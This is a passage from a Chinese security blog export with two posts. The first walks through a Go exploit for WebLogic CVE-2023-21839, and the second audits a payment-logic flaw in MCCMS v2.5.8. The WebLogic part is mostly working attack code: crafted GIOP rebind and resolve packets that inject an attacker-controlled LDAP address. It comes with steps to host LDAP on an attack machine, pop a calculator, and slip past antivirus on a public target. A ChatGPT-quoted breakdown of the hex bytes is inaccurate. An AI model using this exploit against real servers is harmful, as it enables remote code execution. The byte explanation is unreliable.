[]byte&#123;giop.MajorVersion&#125;,\n\t\t\tMinorVersion: []byte&#123;giop.MinorVersion&#125;,\n\t\t\tMessageFlags: []byte&#123;giop.BigEndianType&#125;,\n\t\t\tMessageType:  []byte&#123;giop.LocateRequestType&#125;,\n\t\t&#125;,\n\t\tRequestId:     giop.Int32(2),\n\t\tTargetAddress: giop.D(giop.KeyAddr),\n\t\tKeyAddress:    giop.D(giop.NameService),\n\t&#125;\n\n\tgiop.Log(2, \"LocateRequest\")\n\t_, _ = conn.Write(locateRequest.Bytes())\n\tbuf := make([]byte, 1024*10)\n\t_, _ = conn.Read(buf)\n\n\ttemp1 := make([]byte, 8)\n\ttemp2 := make([]byte, 8)\n\n\t// GIOP Header\n\t// IOR Prefix\n\tiOff := 0x60\n\tfor buf[iOff] != 0x00 &#123;\n\t\t// ProfileHost\n\t\tiOff++\n\t&#125;\n\tif iOff > 1024*10 &#123;\n\t\treturn\n\t&#125;\n\tfor buf[iOff] == 0x00 &#123;\n\t\tiOff++\n\t&#125;\n\tp := make([]byte, 2)\n\tp[0] = buf[iOff]\n\tiOff++\n\tp[1] = buf[iOff]\n\n\ttempPort := int(binary.BigEndian.Uint16(p))\n\n\tif tempPort != port &#123;\n\t\treturn\n\t&#125;\n\n\tlt := iOff - 0x60\n\tfOff := 0x60 + lt + 0x75\n\t// other cases\n\tfor buf[fOff] == 0x00 &#123;\n\t\tfOff++\n\t&#125;\n\n\t// Fake ObjectKey1\n\tcopy(temp1[0:8], buf[fOff:fOff+8])\n\tcopy(temp2[4:8], buf[fOff+4:fOff+8])\n\t// Fake ObjectKey2\n\tcopy(temp2[0:4], []byte&#123;0xff, 0xff, 0xff, 0xff&#125;)\n\tkey1 = giop.E(temp1)\n\tkey2 = giop.E(temp2)\n\n\twlsKey1 = strings.ReplaceAll(wlsKey1, \"&#123;&#123;key1&#125;&#125;\", key1)\n\n\trebindAny := &giop.RebindRequest&#123;\n\t\tHeader: &giop.Header&#123;\n\t\t\tMagic:        giop.D(giop.GIOP),\n\t\t\tMajorVersion: []byte&#123;giop.MajorVersion&#125;,\n\t\t\tMinorVersion: []byte&#123;giop.MinorVersion&#125;,\n\t\t\tMessageFlags: []byte&#123;giop.BigEndianType&#125;,\n\t\t\tMessageType:  []byte&#123;giop.RequestType&#125;,\n\t\t&#125;,\n\t\tRequestId:        giop.Int32(3),\n\t\tResponseFlags:    []byte&#123;giop.WithTargetScope&#125;,\n\t\tTargetAddress:    giop.D(giop.KeyAddr),\n\t\tKeyAddress:       giop.D(wlsKey1),\n\t\tRequestOperation: giop.D(giop.RebindAnyOp),\n\t\tServiceContextList: &giop.ServiceContextList&#123;\n\t\t\tSequenceLength: giop.Int32(6),\n\t\t\tServiceContext: []*giop.ServiceContext&#123;\n\t\t\t\tServiceContext0,\n\t\t\t\tServiceContext1,\n\t\t\t\t&#123;\n\t\t\t\t\tVSCID:      giop.D(\"000000\"),\n\t\t\t\t\tSCID:       giop.D(\"06\"),\n\t\t\t\t\tEndianness: []byte&#123;giop.BigEndianType&#125;,\n\t\t\t\t\tData: giop.D(\"0000000000002849444c3a6f6d672e6f72672f53656e64696e67436\" +\n\t\t\t\t\t\t\"f6e746578742f436f6465426173653a312e30000000000100000000000000b8000102000000000\" +\n\t\t\t\t\t\t\"d3137322e32362e3131322e310000ec5b000000640042454108010300000000010000000000000\" +\n\t\t\t\t\t\t\"0000000002849444c3a6f6d672e6f72672f53656e64696e67436f6e746578742f436f646542617\" +\n\t\t\t\t\t\t\"3653a312e30000000000331320000000000014245412a0000001000000000000000005eedafdeb\" +\n\t\t\t\t\t\t\"c0d227000000001000000010000002c00000000000100200000000300010020000100010501000\" +\n\t\t\t\t\t\t\"10001010000000003000101000001010905010001\"),\n\t\t\t\t&#125;,\n\t\t\t\t&#123;\n\t\t\t\t\tVSCID:      giop.D(\"000000\"),\n\t\t\t\t\tSCID:       giop.D(\"0f\"),\n\t\t\t\t\tEndianness: []byte&#123;giop.BigEndianType&#125;,\n\t\t\t\t\tData:       giop.D(\"00000000000000000000000000000100000000000000000100000000000000\"),\n\t\t\t\t&#125;,\n\t\t\t\t&#123;\n\t\t\t\t\tVSCID:      giop.D(\"424541\"),\n\t\t\t\t\tSCID:       giop.D(\"03\"),\n\t\t\t\t\tEndianness: []byte&#123;giop.BigEndianType&#125;,\n\t\t\t\t\tData:       giop.D(\"00000000000000\" + key2 + \"00000000\"),\n\t\t\t\t&#125;,\n\t\t\t\tServiceContext2,\n\t\t\t&#125;,\n\t\t&#125;,\n\t\tStubData: giop.D(\"0000000000000001000000047465737400000001000000000000001d0000001c00000000000000010\" +\n\t\t\t\"0000000000000010000000000000000000000007fffff0200000054524d493a7765626c6f6769632e6a6e64692e69\" +\n\t\t\t\"6e7465726e616c2e466f726569676e4f70617175655265666572656e63653a4432333744393143423246304636384\" +\n\t\t\t\"13a3344323135323746454435393645463100000000007fffff020000002349444c3a6f6d672e6f72672f434f5242\" +\n\t\t\t\"412f57537472696e6756616c75653a312e300000000000\" + ldap),\n\t&#125;\n\n\tgiop.Log(3, \"RebindRequest\")\n\t_, _ = conn.Write(rebindAny.Bytes())\n\tbuf = make([]byte, 1024*10)\n\t_, _ = conn.Read(buf)\n\n\tstartOff := 0x64 + lt + 0xc0 + len(host) + // SendingContextRuntime\n\t\t0xac + lt + // IOR ProfileHost ProfilePort\n\t\t0x5d // ObjectKey Prefix\n\tfor buf[startOff] != 0x32 &#123;\n\t\tif startOff > 0x2710 &#123;\n\t\t\tbreak\n\t\t&#125;\n\t\t// InternalKey Offset\n\t\tstartOff++\n\t&#125;\n\n\tif startOff > 0x2710 &#123;\n\t\tkey3 = giop.E([]byte&#123;0x32, 0x38, 0x39, 0x00&#125;)\n\t&#125; else &#123;\n\t\tkey3 = giop.E(buf[startOff : startOff+4])\n\t&#125;\n\n\twlsKey2 = strings.ReplaceAll(wlsKey2, \"&#123;&#123;key3&#125;&#125;\", key3)\n\twlsKey2 = strings.ReplaceAll(wlsKey2, \"&#123;&#123;key1&#125;&#125;\", key1)\n\n\trebindAnyTwice := &giop.RebindRequest&#123;\n\t\tHeader: &giop.Header&#123;\n\t\t\tMagic:        giop.D(giop.GIOP),\n\t\t\tMajorVersion: []byte&#123;giop.MajorVersion&#125;,\n\t\t\tMinorVersion: []byte&#123;giop.MinorVersion&#125;,\n\t\t\tMessageFlags: []byte&#123;giop.BigEndianType&#125;,\n\t\t\tMessageType:  []byte&#123;giop.RequestType&#125;,\n\t\t&#125;,\n\t\tRequestId:        giop.Int32(4),\n\t\tResponseFlags:    []byte&#123;giop.WithTargetScope&#125;,\n\t\tTargetAddress:    giop.D(giop.KeyAddr),\n\t\tKeyAddress:       giop.D(wlsKey2),\n\t\tRequestOperation: giop.D(giop.RebindAnyOp),\n\t\tServiceContextList: &giop.ServiceContextList&#123;\n\t\t\tSequenceLength: giop.Int32(4),\n\t\t\tServiceContext: []*giop.ServiceContext&#123;\n\t\t\t\tServiceContext0,\n\t\t\t\tServiceContext1,\n\t\t\t\t&#123;\n\t\t\t\t\tVSCID:      giop.D(\"424541\"),\n\t\t\t\t\tSCID:       giop.D(\"03\"),\n\t\t\t\t\tEndianness: []byte&#123;giop.BigEndianType&#125;,\n\t\t\t\t\tData:       giop.D(\"00000000000000\" + key2 + \"00000000\"),\n\t\t\t\t&#125;,\n\t\t\t\tServiceContext2,\n\t\t\t&#125;,\n\t\t&#125;,\n\t\tStubData: giop.D(\"00000001000000047465737400000001000000000000001d0000001c00000000000000010\" +\n\t\t\t\"0000000000000010000000000000000000000007fffff0200000054524d493a7765626c6f6769632e6a6e64692e69\" +\n\t\t\t\"6e7465726e616c2e466f726569676e4f70617175655265666572656e63653a4432333744393143423246304636384\" +\n\t\t\t\"13a3344323135323746454435393645463100000000007fffff020000002349444c3a6f6d672e6f72672f434f5242\" +\n\t\t\t\"412f57537472696e6756616c75653a312e300000000000\" + ldap),\n\t&#125;\n\n\tgiop.Log(4, \"RebindRequest\")\n\t_, _ = conn.Write(rebindAnyTwice.Bytes())\n\tbuf = make([]byte, 1024*10)\n\t_, _ = conn.Read(buf)\n\n\tlocateRequest2 := &giop.LocateRequest&#123;\n\t\tHeader: &giop.Header&#123;\n\t\t\tMagic:        giop.D(giop.GIOP),\n\t\t\tMajorVersion: []byte&#123;giop.MajorVersion&#125;,\n\t\t\tMinorVersion: []byte&#123;giop.MinorVersion&#125;,\n\t\t\tMessageFlags: []byte&#123;giop.BigEndianType&#125;,\n\t\t\tMessageType:  []byte&#123;giop.LocateRequestType&#125;,\n\t\t&#125;,\n\t\tRequestId:     giop.Int32(5),\n\t\tTargetAddress: giop.D(giop.KeyAddr),\n\t\tKeyAddress:    giop.D(giop.NameService),\n\t&#125;\n\n\tgiop.Log(5, \"LocateRequest\")\n\t_, _ = conn.Write(locateRequest2.Bytes())\n\tbuf = make([]byte, 1024*10)\n\t_, _ = conn.Read(buf)\n\n\tresolve := &giop.ResolveRequest&#123;\n\t\tHeader: &giop.Header&#123;\n\t\t\tMagic:        giop.D(giop.GIOP),\n\t\t\tMajorVersion: []byte&#123;giop.MajorVersion&#125;,\n\t\t\tMinorVersion: []byte&#123;giop.MinorVersion&#125;,\n\t\t\tMessageFlags: []byte&#123;giop.BigEndianType&#125;,\n\t\t\tMessageType:  []byte&#123;giop.RequestType&#125;,\n\t\t&#125;,\n\t\tRequestId:        giop.Int32(6),\n\t\tResponseFlags:    []byte&#123;giop.WithTargetScope&#125;,\n\t\tTargetAddress:    giop.D(giop.KeyAddr),\n\t\tKeyAddress:       giop.D(wlsKey1),\n\t\tRequestOperation: giop.D(giop.ResolveOp),\n\t\tServiceContextList: &giop.ServiceContextList&#123;\n\t\t\tSequenceLength: giop.Int32(4),\n\t\t\tServiceContext: []*giop.ServiceContext&#123;\n\t\t\t\tServiceContext0,\n\t\t\t\tServiceContext1,\n\t\t\t\t&#123;\n\t\t\t\t\tVSCID:      giop.D(\"424541\"),\n\t\t\t\t\tSCID:       giop.D(\"03\"),\n\t\t\t\t\tEndianness: []byte&#123;giop.BigEndianType&#125;,\n\t\t\t\t\tData:       giop.D(\"00000000000000\" + key2 + \"00000000\"),\n\t\t\t\t&#125;,\n\t\t\t\tServiceContext2,\n\t\t\t&#125;,\n\t\t&#125;,\n\t\tCosNamingDissector: giop.D(\"00000000000000010000000574657374000000000000000100\"),\n\t&#125;\n\tgiop.Log(6, \"ResolveRequest\")\n\t_, _ = conn.Write(resolve.Bytes())\n\tbuf = make([]byte, 1024*10)\n\t_, _ = conn.Read(buf)\n\n\tresolveTwice := &giop.ResolveRequest&#123;\n\t\tHeader: &giop.Header&#123;\n\t\t\tMagic:        giop.D(giop.GIOP),\n\t\t\tMajorVersion: []byte&#123;giop.MajorVersion&#125;,\n\t\t\tMinorVersion: []byte&#123;giop.MinorVersion&#125;,\n\t\t\tMessageFlags: []byte&#123;giop.BigEndianType&#125;,\n\t\t\tMessageType:  []byte&#123;giop.RequestType&#125;,\n\t\t&#125;,\n\t\tRequestId:        giop.Int32(7),\n\t\tResponseFlags:    []byte&#123;giop.WithTargetScope&#125;,\n\t\tTargetAddress:    giop.D(giop.KeyAddr),\n\t\tKeyAddress:       giop.D(wlsKey2),\n\t\tRequestOperation: giop.D(giop.ResolveOp),\n\t\tServiceContextList: &giop.ServiceContextList&#123;\n\t\t\tSequenceLength: giop.Int32(4),\n\t\t\tServiceContext: []*giop.ServiceContext&#123;\n\t\t\t\tServiceContext0,\n\t\t\t\tServiceContext1,\n\t\t\t\t&#123;\n\t\t\t\t\tVSCID:      giop.D(\"424541\"),\n\t\t\t\t\tSCID:       giop.D(\"03\"),\n\t\t\t\t\tEndianness: []byte&#123;giop.BigEndianType&#125;,\n\t\t\t\t\tData:       giop.D(\"00000000000000\" + key2 + \"00000000\"),\n\t\t\t\t&#125;,\n\t\t\t\tServiceContext2,\n\t\t\t&#125;,\n\t\t&#125;,\n\t\tCosNamingDissector: giop.D(\"00000000000000010000000574657374000000000000000100\"),\n\t&#125;\n\tgiop.Log(7, \"ResolveRequest\")\n\t_, _ = conn.Write(resolveTwice.Bytes())\n\tbuf = make([]byte, 1024*10)\n\t_, _ = conn.Read(buf)\n\n\terr = conn.Close()\n\tif err != nil &#123;\n\t\tfmt.Println(err)\n\t&#125;\n&#125;\n\n开始看到这个脚本让我非常困惑，其中最多的就是奇奇怪怪的数字，后面问了问chatgpt才知道\n如\nCosNamingDissector: giop.D(\"00000000000000010000000574657374000000000000000100\")\n\n\n\n\n\n\n\n\n\n\n它表示一个GIOP（General Inter-ORB Protocol）消息的二进制编码。GIOP是CORBA（Common Object Request Broker Architecture）规范中定义的一种通信协议，用于在分布式对象系统中进行通信。\n具体来说，这个字节数组表示一个GIOP消息的头部，包括以下信息：\n\n00000000 00000001：GIOP版本号，这里表示版本1.0\n00000000 00000101：GIOP消息标志，这里表示请求消息\n74657374：GIOP消息类型，这里表示一个字符串消息\n00000000 00000001：请求消息的标识符，这里为1\n\n该go脚本流程大致为\n\n\n\n\n\n\n\n\n\n\n解析命令行参数（IP地址、端口、LDAP字符串）\n获取Weblogic版本号\n根据Weblogic版本号设置密钥\n连接到Weblogic服务器\n设置ServiceContext\n构造恶意数据包\n发送恶意数据包\n关闭连接\n\n\n\n\n\n\n\n\n\n\n代码中的 import 语句引用了四个不同的包：\nCVE-2023-21839encoding/binaryencoding/hexflagfmtnetstrings其中， flag 用于解析命令行参数。 net 用于处理网络连接。 strings 用于字符串处理。encoding&#x2F;hex 用于十六进制编码&#x2F;解码，encoding&#x2F;binary 用于处理二进制数据。\n\n\n\n\n\n\n\n\n\nmain() 函数开始时解析命令行参数并打印相应的提示信息。然后调用 giop.GetVersion() 函数检测 WebLogic 服务器的版本。分析完版本后然后根据 WebLogic 版本选择不同的攻击方式，分别设置变量 wlsKey1 和 wlsKey2，最后使用 net.Dial() 函数建立与 WebLogic 服务器的连接。\npackage giop\n\nimport (\n\t\"encoding/binary\"\n\t\"encoding/hex\"\n)\n\nfunc D(str string) []byte &#123;\n\tdata, _ := hex.DecodeString(str)\n\treturn data\n&#125;\n\nfunc E(b []byte) string &#123;\n\treturn hex.EncodeToString(b)\n&#125;\n\nfunc Int32(i int) []byte &#123;\n\tb := make([]byte, 4)\n\tbinary.BigEndian.PutUint32(b, uint32(i))\n\treturn b\n&#125;\n\n\n\n\n由于该漏洞的影响范围为Weblogic 12.2.1.3.0, 12.2.1.4.0, 14.1.1.0.0，所以该代码先进行了网站weblogic版本检测，如果不是12或14版本则进行测试，否则结束\n\n\n\n\n\n\n\n\n\nWebLogic Server使用WLS Key来加密和解密敏感数据，例如密码和证书私钥\nWLS Key是由WebLogic Server生成并管理的，它不是由管理员手动设置的，也不是系统默认的。在WebLogic Server启动时，它会自动生成一个WLS Key，并使用该密钥来加密和解密存储在WebLogic Server中的敏感数据，例如密码和证书私钥。\nWebLogic Server生成的WLS Key是每个实例唯一的，每个实例都有自己的WLS Key。这是因为WLS Key是通过使用特定于WebLogic Server实例的信息生成的\n所以在下面的代码中wls作用\nif ver == if ver == \"12\" &#123;\n\t\tfmt.Println(\"[*] weblogic 12\")\n\t\twlsKey1 = \"00424541080103000000000c41646d696e53657276657200000000000000003349\" +\n\t\t\t\"444c3a7765626c6f6769632f636f7262612f636f732f6e616d696e672f4e616d696e6743\" +\n\t\t\t\"6f6e74657874416e793a312e3000000000000238000000000000014245412c0000001000\" +\n\t\t\t\"00000000000000&#123;&#123;key1&#125;&#125;\"\n\t\twlsKey2 = \"00424541080103000000000c41646d696e53657276657200000000000000003349\" +\n\t\t\t\"444c3a7765626c6f6769632f636f7262612f636f732f6e616d696e672f4e616d696e6743\" +\n\t\t\t\"6f6e74657874416e793a312e30000000000004&#123;&#123;key3&#125;&#125;000000014245412c0000001000\" +\n\t\t\t\"00000000000000&#123;&#123;key1&#125;&#125;\"\n\t&#125; else if ver == \"14\" &#123;\n\t\tfmt.Println(\"[*] weblogic 14\")\n\t\twlsKey1 = \"00424541080103000000000c41646\" +\n\t\t\t\"d696e53657276657200000000000000003349444c3a7765626c\" +\n\t\t\t\"6f6769632f636f7262612f636f732f6e616d696e672f4e616d6\" +\n\t\t\t\"96e67436f6e74657874416e793a312e30000000000002380000\" +\n\t\t\t\"00000000014245412e000000100000000000000000&#123;&#123;key1&#125;&#125;\"\n\t\twlsKey2 = \"00424541080103000000000c41646d696e53657276657\" +\n\t\t\t\"200000000000000003349444c3a7765626c6f6769632f636f72\" +\n\t\t\t\"62612f636f732f6e616d696e672f4e616d696e67436f6e74657\" +\n\t\t\t\"874416e793a312e30000000000004&#123;&#123;key3&#125;&#125;00000001424541\" +\n\t\t\t\"2e000000100000000000000000&#123;&#123;key1&#125;&#125;\"\n\t&#125; else &#123;\n\t\tfmt.Println(\"[!] error and exit\")\n\t&#125;\n\n\n\n\n\n\n这个go脚本的使用很简单，先在攻击机1369端口打开ldap\n先进行编译\ngo build main.go -o web.exe\n\n然后攻击机上打开1369端口，挂上ldap\n\n最后简单跑个计算器（测试时间：2023/3/1，火绒未检测到，但是弹cmd还是会被警告的）\n\n\n公网测试太穷了，没有第二台电脑，在aliyun上搞了个weblogic，看看是否检测的到吗\n这是公网环境下的\n\n然后一样的测试如上，会被windows defender检测到，但是不会拦截，还是会一样执行命令\n和朋友借了一下服务器测试，确实是可以实现公网测试的，而且windows defender并未拦截(公网测试时间:2023&#x2F;3&#x2F;2)\n\nCVE-2023-33246","slug":"CVE-Test","date":"2022-12-01T04:07:19.084Z","categories_index":"网络安全学习","tags_index":"漏洞","author_index":"Ttoc"},{"id":"3ad1b2302cf37f01616c68ffdd393d02","title":"漏洞测试","content":"训练一下自己的代码审计能力，了解一些开源框架的漏洞形成原因，并自己尝试复现\n\n\n漫城CMS v2.5.8漏洞分析\n\n\n\n\n\n\n\n\n免费看漫画(\n环境搭建phpstudy\n\n\n\n\n\n\n\n\nApache 2.4.43MySQL 8.0.12php 7.3.4\n管理员页面\n主页\n信息收集官方文档信息整体目录结构\n如下（大致猜测漏洞出现位置）：\n\n\n\n\n\n\n\n\n\n  │─attachment &#x2F;&#x2F;附件目录  │─caches  &#x2F;&#x2F;缓存目录  │─packs &#x2F;&#x2F;静态文件目录  │─rewrite &#x2F;&#x2F;伪静态文件目录  │─sys &#x2F;&#x2F;系统核心目录  │  │─apps &#x2F;&#x2F;应用目录  │  │─class &#x2F;&#x2F;第三方库类目录【可能存在】  │  │─errors &#x2F;&#x2F;系统错误提示目录  │  │─libs &#x2F;&#x2F;系统常量配置目录  │  │─system &#x2F;&#x2F;CI框架目录  │─template &#x2F;&#x2F;模板目录【可能存在】  │  │─admin &#x2F;&#x2F;后台模板  │  │─install &#x2F;&#x2F;系统安装模板  │  │─pc &#x2F;&#x2F;前台PC端模版  │  │─wap &#x2F;&#x2F;前台手机模版  │─admin.php &#x2F;&#x2F;后台入口文件（为了安全起见，请修改文件名）【可能存在】  └─index.php &#x2F;&#x2F;入口文件【可能存在】\n模板目录结构系统模板系统放在&#x2F;template&#x2F;目录下。在后台站点设置中，可以选择当前使用的模板\n\n\n\n\n\n\n\n\n\n│─template&#x2F;[pc&#x2F;wap]&#x2F;1&#x2F; 模板1│ ├─js js文件│ ├─css css文件│ ├─images 图片文件│ ├─html 模板文件目录（该目录名可以随意修改，注意tpl.php也有需要同时修改）│ │  │─custom 自定义模板目录│ │  │─author 作者中心目录│ │  │  │─packs.html 样式模版│ │  │  │─head.html 模板头部文件│ │  │  │─bottom.html 模板底部文件│ │  │  │─left.html 模板左部文件│ │  │  │─right.html 模板右部文件│ │  │  │─chapter.html 章节列表模版│ │  │  │─chapter_add.html 新增章节模版│ │  │  │─chapter_edit.html 修改章节模版│ │  │  │─comic.html 漫画列表模版│ │  │  │─comic_add.html 新增漫画模版│ │  │  │─comic_info.html 漫画详情模版│ │  │  │─comment.html 读者评论模版│ │  │  │─drawing.html 提现记录模版│ │  │  │─drawing_add.html 申请提现模版│ │  │  │─home.html 作者主页模版│ │  │  │─income.html 分成记录模版│ │  │  │─index.html 作者中心主页模版│ │  │  │─renzheng.html 作者认证模版│ │  │─user 读者中心目录│ │  │  │─packs.html 样式模版│ │  │  │─head.html 模板头部文件│ │  │  │─bottom.html 模板底部文件│ │  │  │─left.html 模板左部文件│ │  │  │─right.html 模板右部文件│ │  │  │─index.html 读者中心主页模版│ │  │  │─bind.html 第三方账号绑定模版│ │  │  │─buy.html 消费记录模版│ │  │  │─comic.html 漫画购买记录模版│ │  │  │─comment.html 评论记录模版│ │  │  │─fav.html 漫画收藏记录模版│ │  │  │─info.html 资料修改模版│ │  │  │─info_pass.html 密码修改模版│ │  │  │─message.html 消息列表模版│ │  │  │─order.html 充值订单记录模版│ │  │  │─read.html 阅读记录模版│ │  │  │─ticket.html 月票消费记录模版│ │  │  │─pay.html 充值中心模版│ │  │  │─pay_cion.html 虚拟币充值模版│ │  │  │─pay_ticket.html 购买月票模版│ │  │  │─pay_vip.html 充值VIP模版│ │  │  │─reg.html 用户注册模版│ │  │  │─login.html 用户登陆模版│ │  │  │─pass.html 找回密码模版│ │  │─packs.html 样式模版│ │  │─head.html 模板头部文件│ │  │─bottom.html 模板底部文件│ │  │─left.html 模板左部文件│ │  │─right.html 模板右部文件│ │  │─category.html 漫画检索模版│ │  │─chapter.html 漫画阅读模版│ │  │─comic.html 漫画详情模版│ │  │─comment.html 漫画评论模版│ │  │─error.html 错误提示模版│ │  │─index.html 主页模版│ │  │─lists.html 分类页模版│ │  │─search.html 漫画搜索模版│ ├─pic.png 模板演示图片文件│ ├─tpl.php 模板信息文件│─tempalte&#x2F;[pc&#x2F;wap]&#x2F;2&#x2F; 模板2│─…│─template&#x2F;[pc&#x2F;wap]&#x2F;n&#x2F; 模板N\n版本更新文档当我们在后台页面时，会弹出更新提醒，在这提醒中我们大致得到了几个已知漏洞的存在\n\n\n\n\n\n\n\n\n\n当前环境mccms v2.5.8\n\n\n在官方提示更新的文档中，我们得到消息\n在当前v2.5.8版本中，存在至少4个漏洞\n\n\n\n\n\n\n\n\n\n1.修复了充值月票逻辑缺陷2.修复了作家发布漫画小说命令执行漏洞3.修复了SQL注入漏洞4.修复了后台一处安全漏洞\nCMS已被找到的公开漏洞信息CNVD-2021-51411【危害低】\n\n\n\n公开时间2021-08-18\n报送时间2021-07-06\n\n\n\n收录时间2021-07-16\n更新时间2021-07-16\n\n\nCVSS 2.0--\n\n\n\nCVSS 3.X--\n\n\n\n影响产品桂林崇胜网络科技有限公司 漫城CMS v2.5.2\n\n\n\nCNVD-2021-48907【危害高】\n\n\n\n公开时间2021-08-12\n报送时间2021-06-28\n\n\n\n收录时间2021-07-09\n更新时间2021-07-09\n\n\nCVSS 2.0--\n\n\n\nCVSS 3.X--\n\n\n\n影响产品桂林崇胜网络科技有限公司 漫城CMS v2.5.2\n\n\n\n\n\n\n\n\n\n\n\n\nCNVD-2021-51867\n中危 Mccms存在任意文件下载漏洞\n桂林崇胜网络科技有限公司 Mccms v2.5.2\n2021-08-18\n\n\n\n\n\n\n\n\n\nCNVD-2021-51492\n中危 Mccms存在文件上传漏洞\n桂林崇胜网络科技有限公司 Mccms v2.5.2\n2021-08-18\n\n\n\n\n\n\n\n\n\nCNVD-2021-51860\n中危 Mccms存在逻辑缺陷漏洞\n桂林崇胜网络科技有限公司 Mccms v2.5.2\n2021-08-18\n批量代码审计Seay代码审计\n\n由我们对更新文档中的信息以及目录结构猜测这些漏洞大概出现在哪些代码处\n漏洞复现1.充值月票逻辑缺陷\n\n\n\n\n\n\n\n\n充值月票逻辑缺陷猜测为支付漏洞常见大致有4种，修改单价，修改总价，修改购买数量，以及重复发包导致以少量的钱实现多次购买\n代码分析查看支付代码\n  #sys/apps/controllers/api/Pay.php \n  //金币\n        $arr[&#x27;pay&#x27;][&#x27;cion&#x27;] = array(\n            array(&#x27;rmb&#x27;=>10,&#x27;cion&#x27;=>Pay_Rmb_Cion*10),\n            array(&#x27;rmb&#x27;=>20,&#x27;cion&#x27;=>Pay_Rmb_Cion*20),\n            array(&#x27;rmb&#x27;=>30,&#x27;cion&#x27;=>Pay_Rmb_Cion*30),\n            array(&#x27;rmb&#x27;=>50,&#x27;cion&#x27;=>Pay_Rmb_Cion*50),\n        );\n        //VIP\n        $arr[&#x27;pay&#x27;][&#x27;vip&#x27;] = array(\n            array(&#x27;day&#x27;=>30,&#x27;rmb&#x27;=>Pay_Vip_Rmb1,&#x27;name&#x27;=>&#x27;月度VIP&#x27;,&#x27;txt&#x27;=>&#x27;有效期30天&#x27;),\n            array(&#x27;day&#x27;=>90,&#x27;rmb&#x27;=>Pay_Vip_Rmb2,&#x27;name&#x27;=>&#x27;季度VIP&#x27;,&#x27;txt&#x27;=>&#x27;有效期90天&#x27;),\n            array(&#x27;day&#x27;=>180,&#x27;rmb&#x27;=>Pay_Vip_Rmb3,&#x27;name&#x27;=>&#x27;半年VIP&#x27;,&#x27;txt&#x27;=>&#x27;有效期180天&#x27;),\n            array(&#x27;day&#x27;=>365,&#x27;rmb&#x27;=>Pay_Vip_Rmb4,&#x27;name&#x27;=>&#x27;年度VIP&#x27;,&#x27;txt&#x27;=>&#x27;有效期365天&#x27;),\n        );\n        //月票\n        $arr[&#x27;pay&#x27;][&#x27;ticket&#x27;] = array(\n            array(&#x27;num&#x27;=>1,&#x27;rmb&#x27;=>1,&#x27;cion&#x27;=>Pay_Rmb_Cion*1),\n            array(&#x27;num&#x27;=>5,&#x27;rmb&#x27;=>5,&#x27;cion&#x27;=>Pay_Rmb_Cion*5),\n            array(&#x27;num&#x27;=>10,&#x27;rmb&#x27;=>10,&#x27;cion&#x27;=>Pay_Rmb_Cion*10),\n        );\n\n/*上面三个数组实现了rmb，金币，月票，vip之间的兑换率*/\n\n        //支付方式\n        $arr[&#x27;pay&#x27;][&#x27;is_wxpay&#x27;] = Pay_Wx_Mode;\n        $arr[&#x27;pay&#x27;][&#x27;is_alipay&#x27;] = Pay_Ali_Mode;\n        $arr[&#x27;pay&#x27;][&#x27;is_qqpay&#x27;] = Pay_QQ_Mode;\n\n上面主要是对数据之间关系的定义，关键在下方代码中，如何让我们的恶意订单成功并入库\n  #sys/apps/controllers/api/Pay.php\n //充值订单入库\npublic function save() &#123;\n    $type = $this->input->get_post(&#x27;type&#x27;,true);\n    $pay = $this->input->get_post(&#x27;pay&#x27;,true);\n    $rmb = (int)$this->input->get_post(&#x27;rmb&#x27;);\n    $num = (int)$this->input->get_post(&#x27;num&#x27;);\n    $day = (int)$this->input->get_post(&#x27;day&#x27;);\n\t$card = $this->input->get_post(&#x27;card&#x27;,true);\n    $dayarr = array(30,90,180,365);\n    if($day == 0) $day = 30;\n    if($type == &#x27;cion&#x27; && ($rmb == 0 || $rmb >9999)) get_json(&#x27;金额错误!!!&#x27;);\n    if($type == &#x27;cion&#x27; && $rmb get_json(&#x27;最低充值金额&#x27;.Pay_Rmb_Min.&#x27;元&#x27;);\n    if($type == &#x27;ticket&#x27; && $num == 0) get_json(&#x27;月票数量错误!!!&#x27;);\n    /*这里有个很明显的漏洞就是，对月票数的限制只有不为0，而对于\n    \n\tif($type == &#x27;card&#x27; && empty($card)) get_json(&#x27;卡密不能为空!!!&#x27;);\n    if($type == &#x27;vip&#x27; && !in_array($day, $dayarr)) get_json(&#x27;Vip时间错误!!!&#x27;);\n    $parr = array(&#x27;cion&#x27;,&#x27;wxpay&#x27;,&#x27;alipay&#x27;,&#x27;qqpay&#x27;);\n    if(!in_array($pay, $parr)) $pay = &#x27;cion&#x27;;\n\n金币支付代码流程分析\n#sys/apps/controllers/api/Pay.php\n        //金币支付\n        if($pay == &#x27;cion&#x27;)&#123;\n            //判断金币是否不足\n            $cion = $rmb * Pay_Rmb_Cion;\n            if($cion > $user[&#x27;cion&#x27;]) get_json(Pay_Cion_Name.&#x27;不足，请先充值!!!&#x27;);\n            \n            //购买月票\n            if($type == &#x27;ticket&#x27;)&#123;\n                $edit[&#x27;ticket&#x27;] = $user[&#x27;ticket&#x27;]+$num;\n                $name = &#x27;购买月票成功&#x27;;\n                $text = &#x27;您花费&#x27;.$cion.Pay_Cion_Name.&#x27;，成功购买了&#x27;.$num.&#x27;张月票&#x27;;\n            &#125;else&#123;\n                $name = &#x27;购买VIP会员成功&#x27;;\n                $text = &#x27;您花费&#x27;.$cion.Pay_Cion_Name.&#x27;，成功购买了&#x27;.$day.&#x27;天Vip会员&#x27;;\n                $edit[&#x27;vip&#x27;] = 1;\n                if($user[&#x27;viptime&#x27;] > time())&#123;\n                    $edit[&#x27;viptime&#x27;] = $user[&#x27;viptime&#x27;]+86400*$day;\n                &#125;else&#123;\n                    $edit[&#x27;viptime&#x27;] = time()+86400*$day;\n                &#125;\n                //判断赠送天数\n                if(($day/30) > Pay_Vip_Month)&#123;\n                \t$sday = (int)(($day/30) - Pay_Vip_Month);\n                \tif($sday > 0)&#123;\n                \t\t$edit[&#x27;viptime&#x27;] = $edit[&#x27;viptime&#x27;]+86400*$sday;\n                \t\t$text .= &#x27;，系统赠送您&#x27;.$sday.&#x27;天&#x27;;\n                \t&#125;\n                &#125;\n            